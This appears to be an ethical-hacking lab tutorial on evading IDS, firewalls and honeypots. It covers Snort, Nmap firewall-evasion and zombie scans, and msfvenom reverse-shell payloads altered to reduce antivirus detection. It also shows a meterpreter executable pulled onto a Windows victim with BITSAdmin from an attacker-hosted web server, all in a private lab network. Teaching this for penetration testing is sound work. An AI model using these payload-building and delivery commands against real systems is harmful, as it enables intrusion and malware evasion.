# Evading IDS, Firewalls, and Honeypots

## Introduction

- Evading IDS and firewalls involves modifying attacks to escape detection by an organization's security systems, whereas honeypots are traps set to detect, deflect, or counteract unauthorized intrusion attempts.

- The widespread adoption of Internet use in the business world has increased network usage, prompting organizations to implement various security measures such as firewalls, intrusion detection systems (IDS), intrusion prevention systems (IPS), and honeypots. These are crucial for protecting networks, which are prime targets for hackers seeking to compromise organizational security. As an expert ethical hacker or penetration tester, a deep understanding of IDS, IPS, firewalls, and honeypots is essential. This includes comprehending their functions, roles, placement, and design implementation within an organization. Additionally, understanding attackers' evasion techniques is vital for detecting and thwarting intrusion attempts.

## Objective

The objective is to evade IDS, firewalls, and perform tasks such as:
- Detect intrusion attempts
- Identify malicious network traffic
- Detect intruders and their attack methods
- Evade firewalls using various techniques

## Overview of Evading IDS, Firewalls, and Honeypots

- Intrusion Detection Systems (IDSs) provide an additional layer of security but are attractive targets for attackers. Attackers employ various evasion techniques to bypass IDS and compromise infrastructure. Firewalls operate based on predefined rules, and attackers can bypass them with extensive knowledge and skill using various techniques. Evasion methods trick firewalls into not filtering generated malicious traffic.

## Methods

#### 1. Intrusion Detection

   - Detect intrusion using Snort
   - Detect malicious network traffic using ZoneAlarm FREE FIREWALL
   - Detect malicious network traffic using honeyBOT

#### 2. Evade Firewalls

   - Bypass Windows Firewall using Nmap evasion techniques
   - Bypass firewall rules using HTTP/FTP Tunneling
   - Bypass antivirus using Metasploit templates
   - Bypass firewall through Windows BITSAdmin

---

### 1. Intrusion Detection using Various Tools

- An Intrusion Detection System (IDS) is a security software or hardware device used to monitor, detect, and protect networks or systems from malicious activities. It alerts security personnel immediately upon detecting intrusions.

- Intrusion Detection Analysts play a crucial role in identifying potential attacks against a network. The rise in Distributed Denial-of-Service (DDoS) attacks on the Internet has heightened concerns about network security. Analysts search for possible attacks by examining IDS logs, packet captures, and correlating them with firewall logs, known vulnerabilities, and general trending data. However, the increasing sophistication of IDS attacks poses challenges in real-time attack scenario reasoning and categorization.

- To excel as a penetration tester and security administrator, a strong understanding of network IPSs, IDSs, malicious network activity, and log information is essential.

- Intrusion Detection Systems are valuable tools that monitor both inbound and outbound network traffic. They continuously inspect data for suspicious activities indicating a potential network or system security breach. IDS checks traffic for signatures matching known intrusion patterns and triggers an alarm upon detection.

**Main Functions of IDS:**

- Gathers and analyzes information to identify possible security policy violations
- Acts as a `"packet-sniffer"`, intercepting packets across communication mediums and protocols
- Evaluates traffic for suspected intrusions, signaling an alarm upon detection

---
#### Detect Intrusions using Snort

- Snort is an open-source network intrusion detection system, capable of performing real-time traffic analysis and packet logging on IP networks. It can perform protocol analysis and content searching/matching and is used to detect a variety of attacks and probes such as buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. It uses a flexible rules language to describe traffic to collect or pass, as well as a detection engine that utilizes a modular plug-in architecture.

**Uses of Snort:**

- Straight packet sniffer such as tcpdump Packet logger (useful for network traffic debugging, etc.)
- Network intrusion prevention system

---

### 2. Evade Firewalls using Various Evasion Techniques

- Evading firewalls is a crucial skill for ethical hackers and penetration testers. This involves manipulating attack sequences to bypass detection by underlying security firewalls.

- Firewalls and IDSs aim to prevent detailed information gathering by tools like Nmap. Despite these measures, Nmap offers features designed to overcome such protections. Ethical hackers often encounter systems behind firewalls during penetration tests, requiring knowledge of firewall evasion rules to extract essential information.

- Some firewall bypassing techniques:
    - Port Scanning
    - Firewalking
    - Banner Grabbing
    - IP Address Spoofing
    - Source Routing
    - Tiny Fragments
    - Using IP Address Instead of URL
    - Using Anonymous Website Surfing Sites
    - Using a Proxy Server
    - ICMP Tunneling
    - ACK Tunneling
    - HTTP Tunneling
    - SSH Tunneling
    - DNS Tunneling
    - Through External Systems
    - MITM Attack
    - Content-based Evasion
    - XSS Attack

---
#### Bypass Windows Firewall using Nmap Evasion Techniques

- Security administrators are essential in fortifying organizational networks. Despite robust defenses, insiders may attempt evasion techniques to discover services on a target. Here, we will discuss how to use Nmap to perform reconnaissance on a target machine by bypassing Windows Firewall rules.

##### Step:

- **Nmap Scans:**
   - Perform a basic Nmap scan on victim machine: `nmap 10.10.1.11`. Observe filtered ports due to the firewall.
   - Conduct a TCP SYN Port Scan: `nmap -sS 10.10.1.11`.
   - Perform an INTENSE Scan: `nmap -T4 -A 10.10.1.11`.
   - Execute a Ping Sweep scan on the subnet: `nmap -sP 10.10.1.0/24`.

- **Zombie Scan:**
   - Perform a Zombie Scan using another machine as the Zombie: `nmap -sI 10.10.1.22 10.10.1.11`.

---

#### Bypass Antivirus using Metasploit Templates

- Antivirus software aims to identify and prevent the execution of malicious processes or files on endpoints. Here, we are modifying Metasploit templates to bypass antivirus detection, allowing the execution of malicious processes on the target machine.

##### Steps

- Generate a payload using msfvenom:
   ```bash
   msfvenom -p windows/shell_reverse_tcp Lhost=10.10.1.13 Lport=444 -f exe > Windows.exe
   ```
- Open Firefox and navigate to [VirusTotal](https://www.virustotal.com).
- Upload the generated Windows.exe file for analysis.

- Review the results showing the number of antivirus vendors detecting the virus.
- Open the Metasploit template file for modification:
    ```bash
    pluma /usr/share/metasploitframework/data/templates/src/pe/exe/template.c
    ```
- In the template.c file, change the payload size on line 3 from 4096 to 4000, save, and close.
- Navigate to the template directory:
    ```bash
    cd /usr/share/metasploit-framework/data/templates/src/pe/exe/
    ```
- Recompile the standard template:
    ```bash
    i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
    ```

- Generate a new payload using the modified template:
    ```bash
    msfvenom -p windows/shell_reverse_tcp Lhost=10.10.1.13 Lport=444 -x evasion.exe -f exe > bypass.exe
    ```
- Switch back to the browser, upload the bypass.exe file to VirusTotal, and confirm the upload.
- Observe the updated results, indicating reduced antivirus detections.

---

#### Bypass Firewall through Windows BITSAdmin

- Utilizing the Background Intelligent Transfer Service (BITS) and BITSAdmin tool, here we are demonstrates the bypassing of firewalls to transfer a malicious file into the target Windows machine. The goal is to showcase the potential security implications of this technique.

##### Steps

- On victim machine, open Control Panel, navigate to System and Security, and select Windows Defender Firewall.

- Customize firewall settings by turning on Windows Defender Firewall for both private and public network settings.

- Switch to the attacker machine.

- Generate a payload using msfvenom:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp Lhost=10.10.1.13 Lport=444 -f exe > /home/attacker/Exploit.exe
   ```

- Create a shared folder, set permissions, and copy the malicious file:
   ```bash
   mkdir /var/www/html/share
   chmod -R 755 /var/www/html/share
   chown -R www-data:www-data /var/www/html/share
   cp /home/attacker/Exploit.exe /var/www/html/share
   ```

- Start the Apache service:
   ```bash
   service apache2 start
   ```

- Switch to the victim machine.

- Launch PowerShell and use BITSAdmin to transfer the malicious file:
    ```powershell
    bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe C:\Exploit.exe
    ```

- Confirm the successful transfer in File Explorer on the C: drive.

- The malicious file is now accessible for potential security exploits.

- Here, we demonstrated bypassing of firewalls through Windows BITSAdmin.

